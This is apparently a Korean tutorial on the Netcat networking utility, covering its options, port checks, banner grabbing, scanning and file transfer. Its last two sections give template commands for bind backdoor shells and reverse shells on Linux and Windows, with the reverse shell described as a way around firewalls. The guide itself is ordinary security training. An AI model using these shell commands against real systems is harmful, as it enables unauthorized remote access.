# Netcat
##### 원작자: 문광일 PM
##### 링크: [KOROMOON][KOROMOONlink]
[KOROMOONlink]: https://koromoon.blogspot.com/2018/01/netcat.html "Go KOROMOON"
##### 작성자: 김태현 사원
##### 작성일자: 2024년 4월 17
</br>


## (1) 설명

Netcat 은 TCP 나 UDP 프로토콜을 사용하는 네트워크 연결에서 데이터를 읽고 쓰는 유틸리티 프로그램임.<br><br>
일반적으로 UNIX 의 cat 명령어와 비슷한 사용법을 가지고 잇지만 cat 명령어를 통해 파일에 쓰거나 읽듯이 Netcat 툴은 네트워크에 읽거나 쓸 수 있음.<br><br>
이것은 스크립트와 병용하여 네트워크에 대한 디버깅, 테스트 툴로써 매우 편리하고 원하는 포트로 원하는 데이터를 주고 받을 수 있는 특징 때문에 악의적으로 사용할 수 있음.<br><br>
또한, 컴퓨터 포렌식에 있어서 라이브 시스템의 데이터를 손상없이 가져오기 위해서도 사용될 수 있음.<br>
원하는 거의 모든 종류의 접속 형태를 만들어 낼 수 있고 흥미로운 몇 가지 내장 기능을 가지고 있기 때문에 다기능의 네트워크 문제해결 및 조사 시에 유용하게 사용 가능함.<br><br>

윈도우 다운로드 : http://eternallybored.org/misc/netcat/<br>
리눅스 다운로드 : https://sourceforge.net/projects/nc110/<br><br>

참고로 SANS 에서 제공하는 Netcat Cheat Sheet 파일은 아래 링크에서 다운받으세요.<br>
https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf<br><br><br>

## (2) 사용법
</br><div align="center">![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/3c135ca7-33d8-4e69-8203-e7da33b4347c)</div><br>
<br>
※ 아래 옵션은 netcat-win32-1.12 버전을 기준으로 정리함.<br><br>

어딘가에 연결 시 : `nc [-options] hostname port[s] [ports] ...`<br>
인바운드 수신 대기 시 : `nc -l -p port [options] [hostname] [port]`<br><br>

옵션 :<br><br>
<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody><tr>
  <td style="border: 1pt solid windowtext; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt; width: 461.2pt;" valign="top" width="615">
  <p align="left" class="MsoNoSpacing"><i><span lang="EN-US"><span style="font-family: courier;">
        -d              콘솔에서 분리되어 백그라운드 모드로 실행<br>
        -e prog         커넥션(Connection)이 이루어졌을 때 후 프로그램을 실행함 (위험!)<br>
        -g gateway      source-routing hop point[s]를 8씩 증가<br>
        -G num          source-routing point를 4, 8, 12 .. 4씩 증가<br>
        -h              도움말<br>
        -i secs         스캔된 포트로 전송된 회선의 지연 간격<br>
        -l              인바운드 커넥션을 위해서 listen 모드로 실행<br>
        -L              소켓 종료 시 재전송 실행<br>
        -n              IP 주소 입력 (DNS 을 사용하지 않음)<br>
        -o file         주고받은 데이터를 헥스 덤프(Hex Dump)하여 파일로 저장함<br>
        -p port         로컬 포트를 지정함<br>
        -r              로컬 이나 원격 포트를 임의로 지정함<br>
        -s addr         로컬 출발지 주소를 지정함<br>
        -t              Telnet 과 같은 협상 과정을 거치도록 설정함<br>
        -c              LF 대신 CRLF 를 보냄<br>
        -u              UDP 모드<br>
        -v              자세한 설명 모드 (더 자세한 정보를 표시하기 위해 두 번 사용)<br>
        -w secs         마지막으로 읽고 난 후 종료할 시간을 정함<br>
        -z              zero-I/O 모드 (스캔 시 사용)<o:p></o:p></span></span></i></p>
  </td>
 </tr>
</tbody></table><br>

참고로 포트 범위는 개별 또는 범위(m-n)일 수 있음.<br><br><br>

## (3) 사용 예
1. 특정 포트에 대한 연결 수립<br><br>
원격 IP 의 특정 포트로 연결하여 Open 되어 있는 여부를 확인함.<br><br>
`nc [IP] [Port]`<br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj26vMovg5synzLGTccviKy3Bh7Fwr9vyJpIEcvNV3O3P_0DR1nvyOh7SbB6BHb0eiqnaYrzV5_Vo75s2gjgF2CPFcuClNe8JDaIMEqh8GzYhAVdkQoOIJ2BwHIjcJMrLlP1UCYigKdAOE/s1600/%25ED%258A%25B9%25EC%25A0%2595+%25ED%258F%25AC%25ED%258A%25B8%25EC%2597%2590+%25EB%258C%2580%25ED%2595%259C+%25EC%2597%25B0%25EA%25B2%25B0+%25EC%2588%2598%25EB%25A6%25BD.png"></div><br><br>

2. 서비스 배너 수집<br><br>
다양한 서비스를 대상으로 그대로 사용할 수 있음.<br>
하지만 HTTP 서비스는 HTTP 헤더 양식을 전송해줘야 함.<br><br>
`echo -e "HEAD / HTTP/1.0\n\n" | nc [IP] 80`<br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoaWHzRs5Eysrtj7MwxJwG93oiVnlK0lhMfsw458wNV7xJYfmxaXrF4mYtIJa-S3t6HVqeSGTxlGrjFngRQHSYpugvkM1nkyIBDjfsZwvRPJxWPNmBe3h70eUUK9qlR8mfkzHGiNtpOzQ/s1600/%25EC%2584%259C%25EB%25B9%2584%25EC%258A%25A4+%25EB%25B0%25B0%25EB%2584%2588+%25EC%2588%2598%25EC%25A7%2591.png"></div><br><br>

3. 포트 스캐닝<br><br>
TCP 프로토콜을 사용하여 특정 포트나 포트 범위를 스캔함.<br><br>
`nc -n -v -z -w 1 [IP] [포트 범위]`<br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh13c9lcWxw5TwLBJpjyNLUm_NZ3zAsQujCfqBInGQ77S6RUAJ5DL5lzdX37VcE_8vbXM0Ux9quTZPYrTjypVuipPBIiaHJcl7cBBkknPy6ikZF1FYbGhW6EZh2m5FDpTQ_PUZ_ut1jwxc/s1600/%25ED%258F%25AC%25ED%258A%25B8+%25EC%258A%25A4%25EC%25BA%2590%25EB%258B%259D.png"></div><br><br>

4. 파일 전송<br><br>
클라이언트(윈도우) -> 서버(Kali Linux)로 파일 전송<br><br>
클라이언트<br>
`nc -w3 [IP] [Port] < [파일명]`<br><br>
서버<br>
`nc -l -p [Port] > [파일명]`<br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLJghqkvJi7EEYkN5gOMcpHOrLAssBsvMkaFseVbjUZ26uWPYWigxTUkSpL_d-qDlSow1hVAbyeoPkAOwBYLI3MS_Orkt2YY6K1u9fsnUeuI1sjW0aTab7uavss0mjGbiAAaZgcuNqs9Y/s1600/%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8%2528%25EC%259C%2588%25EB%258F%2584%25EC%259A%25B0%2529-%25EC%2584%259C%25EB%25B2%2584%2528Kali+Linux%2529%25EB%25A1%259C+%25ED%258C%258C%25EC%259D%25BC+%25EC%25A0%2584%25EC%2586%25A1_1.png"></div><br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhesAfNu5IJ2nouAur7moiNTHJ-NOV99AZq0ScVga1EFcziWg7qjVBuvRycwNYQPLW3NHvxT-McO7iDvJXYUtvqK5Xlni5ZMjG3pujhXPey6-JA_GrJOqfUq2rKIVCTI18j1eYIKashfuM/s1600/%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8%2528%25EC%259C%2588%25EB%258F%2584%25EC%259A%25B0%2529-%25EC%2584%259C%25EB%25B2%2584%2528Kali+Linux%2529%25EB%25A1%259C+%25ED%258C%258C%25EC%259D%25BC+%25EC%25A0%2584%25EC%2586%25A1_2.png"></div><br><br>

5. 백도어 쉘 (Backdoor Shell)<br><br>
Netcat 툴을 이용한 백도어 쉘의 기본 매커니즘은 특정 포트(-p)에서 listen 모드(-l)로 실행하여 연결 수립 시 특정 쉘을 실행(-e)하도록 옵션을 지정하는 방식임.<br><br>

리눅스 환경(서버)에서 백도어 쉘<br>
`nc -l -p [로컬 포트] -e /bin/bash`<br><br>

윈도우 환경(서버)에서 백도어 쉘<br>
`nc -l -p [로컬 포트] -e cmd.exe`<br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBdx0Kzn5FlS4vy-O59_HtqxLVa1amIMhFdxbKwmRBLxk_HUM-LPMLg6asSVyahZohOVEMXvrNGzvjSY0osxM9mJOwuSfXV2Ck_u8AcP4XqCydi61KwSpbA8CAyPt8xx7_e_7x1OHXt0U/s1600/Backdoor+Shell+%25EC%2584%259C%25EB%25B2%2584.png"></div><br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSZei4HxKQGGb3QYa8gsdrbxiTfBQp15VwdjTCm0jfB2U2xEm3E70xUFhmq4tmR4BclG12RoUtChqnRztb-o6iqerwGEVeFL99ZTZoB9R2Mvbs1z4xA2pDatgcHElAgdSsbyafrpimIRw/s1600/Backdoor+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B81.png"></div><br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJ9VfZoyrHFHhQ4ldYU6bQfgrH8yPhikT1dCuZSx_Oi9giWq-mohcOVc_WjqC46L_vlEJO_ikY1NLBYquwb9pR1E1zNDUAmJsumn9Q_8wa71aRwDqaYxLCpv3FfFCSAjVnDblt6_c-Dt8/s1600/Backdoor+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B82.png"></div><br>
위 스샷에서 서버(Kali Linux) 측 쉘에 접속 후 명령어 뒤에 세미콜론 문자(;)를 덧붙여야 함.<br>
(사용하는 클라이언트 마다 다를 수 있음)<br><br>

6. 리버스 쉘 (Reverse Shell)<br><br>

**Netcat 툴을 이용한 백도어 쉘의 기본 매커니즘은 백도어 쉘과는 반대로 보통 서버 앞단에 방화벽을 우회하기 위해서 리버스 쉘을 이용함.**<br>
**방화벽에서 허용된 나가는 포트를 이용하여 클라이언트 측에서 쉘을 실행시킨 후 서버 측에서 접속함.**<br><br>

리눅스 환경(서버)에서 리버스 쉘<br>
`nc [자신의 IP 주소] [포트] -e /bin/bash`<br><br>

윈도우 환경(서버)에서 리버스 쉘<br>
`nc -l -p [로컬 포트] -e cmd.exe`<br>
`nc [자신의 IP 주소] [포트] -e cmd.exe`<br>

<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQWHXV2Sba-_p1a2eB8zqbCVgQqAaJ-aakB2RXHV05B8I5LH3zkcIdkmRvxFy9QyqSSzzSo51nKxzc_Y1Yiv1OCaR6kd6H-8zVXYHyACv0Bwx7TSVirNYVyC6tbfCSndhpXyRI8ys7-3M/s1600/Reverse+Shell+%25EC%2584%259C%25EB%25B2%2584.png"></div><br>
<div align="center"><img src ="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgILlZyiTOyqIOo5Gchyphenhyphen5sn1Ypk0XQImvPwJXuZrrCA_Kt0TiyL3tUHnGclcnSH5-Un9W5DhwrzuIr-H6k6lnpD-PmHOP80Y6bl4sny7yyx6yEUxVGKL5elIWNmSDI5UqHXT9RSVTLAjn8/s1600/Reverse+Shell+%25ED%2581%25B4%25EB%259D%25BC%25EC%259D%25B4%25EC%2596%25B8%25ED%258A%25B8.png"></div><br>

